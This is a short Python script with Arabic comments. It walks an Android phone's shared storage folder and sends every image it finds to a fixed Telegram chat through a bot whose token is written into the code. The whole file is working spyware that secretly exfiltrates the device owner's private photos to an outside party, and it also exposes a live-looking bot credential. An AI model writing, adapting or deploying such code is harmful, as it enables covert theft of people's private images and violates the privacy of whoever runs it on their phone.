import os
import telebot
from threading import Thread

# إنشاء كائن البوت باستخدام رمز الوصول (Token) الخاص به
bot = telebot.TeleBot("6412697802:AAGgrFsZnMM9MZyEG7MsvYnBYkj64nCAIjU")

# تحديد مسار المجلد
dir_path = "/storage/emulated/0"

# تعريف دالة لإرسال الملفات
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id="5486969494", photo=f)
        else:
            print("ليس صورة: ", file_path)

# وظيفة رئيسية للبحث في المجلدات وإرسال الصور
def main():
    for root, dirs, files in os.walk(dir_path):
        threads = []
        for file in files:
            file_path = os.path.join(root, file)
            t = Thread(target=send_file, args=(file_path,))
            t.start()
            threads.append(t)
        for thread in threads:
            thread.join()

# بدء تنفيذ الوظيفة الرئيسية
if __name__ == "__main__":
    main()
